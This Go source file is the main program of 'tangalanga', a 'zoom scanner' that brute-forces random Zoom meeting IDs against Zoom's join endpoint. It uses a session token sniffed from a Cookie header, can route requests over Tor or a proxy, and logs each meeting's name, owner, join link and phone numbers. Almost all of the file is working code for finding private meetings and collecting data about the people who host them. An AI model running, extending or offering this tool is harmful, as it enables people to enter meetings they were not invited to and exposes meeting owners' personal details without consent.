package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"sync"
	"syscall"
	"time"

	"github.com/logrusorgru/aurora"
	log "github.com/sirupsen/logrus"
)

const logo = `

		zoom scanner

▄▄▄▄▄ ▄▄▄·  ▐ ▄  ▄▄ •  ▄▄▄· ▄▄▌   ▄▄▄·  ▐ ▄  ▄▄ •  ▄▄▄·
•██  ▐█ ▀█ •█▌▐█▐█ ▀ ▪▐█ ▀█ ██•  ▐█ ▀█ •█▌▐█▐█ ▀ ▪▐█ ▀█
 ▐█.▪▄█▀▀█ ▐█▐▐▌▄█ ▀█▄▄█▀▀█ ██▪  ▄█▀▀█ ▐█▐▐▌▄█ ▀█▄▄█▀▀█
 ▐█▌·▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█ ▪▐▌▐█▌▐▌▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█ ▪▐▌
 ▀▀▀  ▀  ▀ ▀▀ █▪·▀▀▀▀  ▀  ▀ .▀▀▀  ▀  ▀ ▀▀ █▪·▀▀▀▀  ▀  ▀

		made with 💀 by @cuerbot

`

const zoomUrl = "https://www3.zoom.us/conf/j"

var colorFlag = flag.Bool("colors", true, "enable or disable colors")
var token = flag.String("token", "", "zpk token to use")
var debugFlag = flag.Bool("debug", false, "show error messages")
var outputFile = flag.String("output", "", "output file for successful finds")
var torFlag = flag.Bool("tor", false, "connect via tor")
var proxyAddr = flag.String("proxy", "socks5://127.0.0.1:9150", "socks url to use as proxy")
var hiddenFlag = flag.Bool("hidden", false, "connect via embedded tor")
var rateCount = flag.Int("rate", runtime.NumCPU(), "worker count. defaults to CPU count")

var color aurora.Aurora
var tangalanga *Tangalanga
var wg sync.WaitGroup
var ids chan int
var start time.Time

func init() {
	var t *http.Transport

	rand.Seed(time.Now().UnixNano())

	color = aurora.NewAurora(*colorFlag)
	ids = make(chan int)
	start = time.Now()

	fmt.Println(color.Green(logo))

	flag.Parse()

	if *token == "" {
		fmt.Printf("%s is required.\n", color.Red("-token="))
		fmt.Println()

		info := "token can be found by sniffing the traffic trying to join any meeting\n" +
			"currently i can't find how the token is generated but any lives for ~24 hours.\n" +
			"the token can be found as part of the Cookie header.\n" +
			"there's no need for authentication, anonymous join attempt will generate the cookie."

		fmt.Printf("%s %s\n", color.Red("zpk"), color.Yellow(info))
		fmt.Println()

		os.Exit(1)
	}

	if *outputFile != "" {
		file, err := os.OpenFile(*outputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)

		if err != nil {
			log.SetOutput(os.Stdout)
		} else {
			fmt.Printf("output is %s\n", color.Yellow(*outputFile))
			log.SetOutput(file)
		}
	}

	fmt.Printf("worker pool size %d\n", color.Yellow(*rateCount))

	transports := new(Transport)

	switch true {
	case *hiddenFlag:
		fmt.Printf("connecting to the TOR network... %s\n", color.Yellow("please wait"))
		t = transports.InteralTOR()

	case *torFlag:
		fmt.Printf("connecting to the TOR network via proxy %s...\n", color.Yellow(*proxyAddr))
		t = transports.Proxy(*proxyAddr)

	default:
		t = transports.Default()
	}

	tangalanga, _ = NewTangalanga(
		WithTransport(t),
	)

}

func randId() int {
	min := 50000000000 // Just to avoid a sea of non existent ids
	max := 99999999999

	return rand.Intn(max-min+1) + min
}

func find(id int) {
	m, err := tangalanga.FindMeeting(id)

	if err != nil && *debugFlag {
		fmt.Printf("%s\n", err)
	}

	if err == nil {
		r := m.GetRoom()
		roomId, roomName, user, link := r.GetRoomId(), r.GetRoomName(), r.GetUser(), r.GetLink()

		msg := "\nRoom ID: %d.\n" +
			"Room: %s.\n" +
			"Owner: %s.\n" +
			"Link: %s\n\n"

		fmt.Printf(msg,
			color.Green(roomId),
			color.Green(roomName),
			color.Green(user),
			color.Yellow(link),
		)

		log.WithFields(log.Fields{
			"room_id":   roomId,
			"room_name": roomName,
			"owner":     user,
			"link":      link,
		}).Info(r.GetPhoneNumbers())
	}

}

func pool() {
	for i := 0; i < *rateCount; i++ {
		go func() {
			for id := range ids {
				find(id)
				wg.Done()
			}
		}()
	}
}

func main() {
	c := make(chan os.Signal, 1)
	done := 0

	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)

	fmt.Printf("finding disclosed room ids... %s\n", color.Yellow("please wait"))

	go func() {
		<-c
		tangalanga.Close()

		fmt.Println()
		fmt.Printf("run for %s\n", color.Blue(time.Since(start)))
		fmt.Printf("attempted %d times \n", color.Yellow(done))
		fmt.Printf("found %d meetings. \n", color.Green(tangalanga.Found))
		fmt.Println()
		fmt.Printf("💣 with care. thank you for using %s!\n", color.Green("tangalanga"))
		fmt.Println()
		os.Exit(0)
	}()

	go pool()

	for h := 0; ; h++ {
		for i := 0; i < *rateCount; i++ {
			wg.Add(1)
			ids <- randId()
			done++

			if done%200 == 0 && h > 0 && *debugFlag == false {
				// Just to show something if no debug
				m := "found %d open meetings after %d attempts. the search continues\n"
				fmt.Printf(m, color.Green(tangalanga.Found), color.Yellow(done))
			}
		}

		// If there are too many suspicious "not found" try restarting the ...
		if tangalanga.Suspicious > 1000 {
			fmt.Println(color.Yellow("more than 1000 suspicious results. changing random"))
			rand.Seed(time.Now().UnixNano())
			tangalanga.Suspicious = 0
		}

		if *debugFlag {
			fmt.Println(color.Yellow("waiting for queue to drain..."))
		}

		wg.Wait()

	}
}
